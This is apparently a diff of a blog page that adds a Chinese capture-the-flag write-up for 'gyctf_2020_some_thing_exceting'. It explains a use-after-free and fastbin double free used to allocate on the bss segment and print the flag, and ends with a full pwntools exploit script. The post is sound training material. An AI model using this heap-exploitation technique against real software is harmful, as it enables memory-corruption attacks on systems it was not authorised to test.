+        <h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="有点奇怪的UAF题，double-free-有点奇怪"><a href="#有点奇怪的UAF题，double-free-有点奇怪" class="headerlink" title="有点奇怪的UAF题，double free 有点奇怪"></a>有点奇怪的UAF题，double free 有点奇怪</h4><h4 id="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"><a href="#做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来" class="headerlink" title="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"></a>做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p>
+<h4 id="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"><a href="#flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8" class="headerlink" title="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"></a>flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p>
+<h4 id="除了没有edit函数，其他都有"><a href="#除了没有edit函数，其他都有" class="headerlink" title="除了没有edit函数，其他都有"></a>除了没有edit函数，其他都有</h4><h4 id="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"><a href="#add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。" class="headerlink" title="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"></a>add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p>
+<h4 id="show函数，将两个地址的内容都打印出来，后期是用来打印flag"><a href="#show函数，将两个地址的内容都打印出来，后期是用来打印flag" class="headerlink" title="show函数，将两个地址的内容都打印出来，后期是用来打印flag"></a>show函数，将两个地址的内容都打印出来，后期是用来打印flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p>
+<h4 id="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free"><a href="#dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free" class="headerlink" title="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free"></a>dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p>
+<h4 id="漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次"><a href="#漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次" class="headerlink" title="漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次"></a>漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次</h4><pre><code class="lang-py">bss=0x6020a8-0x10
+
+add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)
+add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;)
+
+dele(0)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p>
+<pre><code class="lang-py">dele(1)
+</code></pre>
+<h4 id="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"><a href="#这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零" class="headerlink" title="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"></a>这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p>
+<pre><code class="lang-py">dele(0) #double free
+</code></pre>
+<h4 id="这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"><a href="#这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等" class="headerlink" title="这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"></a>这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p>
+<pre><code>add(0x40,p64(bss),0x40,&#39;AAAA&#39;)
+</code></pre><h4 id="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"><a href="#再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址" class="headerlink" title="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"></a>再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p>
+<h4 id="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"><a href="#再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址" class="headerlink" title="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"></a>再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址</h4><pre><code class="lang-py">add(0x40,&#39;MMMM&#39;,0x40,&#39;kkkk&#39;)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p>
+<h4 id="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"><a href="#再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。" class="headerlink" title="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"></a>再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。</h4><pre><code class="lang-py">show(4)
+</code></pre>
+<h4 id="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"><a href="#想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。" class="headerlink" title="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"></a>想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,26884)
+p=process(&quot;./gyctf_2020_some_thing_exceting&quot;)
+elf=ELF(&#39;./gyctf_2020_some_thing_exceting&#39;)
+libc=ELF(&#39;./libc-2.23.so&#39;)
+context.log_level=&quot;debug&quot;
+
+
+def add(size1,content1,size2,content2):
+    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;1&#39;)
+    p.sendlineafter(&quot;&gt; ba&#39;s length : &quot;,str(size1))
+    p.sendlineafter(&#39;&gt; ba : &#39;,content1)
+    p.sendlineafter(&quot;&gt; na&#39;s length : &quot;,str(size2))
+    p.sendlineafter(&#39;&gt; na : &#39;,content2)
+
+def dele(index):
+    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;3&#39;)
+    p.sendlineafter(&#39;Banana ID :&#39;,str(index))
+
+def show(index):
+    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;4&#39;)
+    p.sendlineafter(&#39;&gt; Banana ID : &gt; SCP project ID : &#39;,str(index))
+
+
+bss=0x6020a8-0x10
+
+add(0x50,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)
+add(0x50,&#39;AAAA&#39;,0x50,&#39;BBBB&#39;)
+
+dele(0)
+dele(1)
+dele(0)
+
+add(0x50,p64(bss),0x50,&#39;AAAA&#39;)
+add(0x50,&#39;MMMM&#39;,0x50,&#39;kkkk&#39;)
+add(0x50,b&#39;1&#39;,0x60,b&#39;&#39;)
+show(4)
+#gdb.attach(p)
+sleep(1)
+#pause()
+#dele(0)
+#p.sendline(payload)
+
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2023/10/16/gyctf_2020_some_thing_exceting/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
       <a href="/2023/10/14/zctf_2016_note3/" class="item-title"></a>
       
       <time datetime="2023-10-14T13:49:24.054Z">
@@ -287,7 +737,7 @@ p.interactive()
   <div class="widget-box">
     <h3 class="widget-title-archive">archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
     </div>
   </div>
 
@@ -301,23 +751,23 @@ p.interactive()
       <ul>
         
           <li>
+            <a class="recent_posts-list-link" href="/2024/11/03/house-of-force/">200~house_of_force</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/29/pwn2%20short/">(no title)</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/21/overlapping_chunks/">overlapping_chunks</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/17/heapcreator/">heapcreator</a>
+          </li>
+        
+          <li>
             <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/">解决libc6软件包和libc6-dev不匹配的问题</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/13/glibc/">glibc</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/12/gostack/">gostack</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/08/pstack/">pstack</a>
           </li>
         
       </ul>
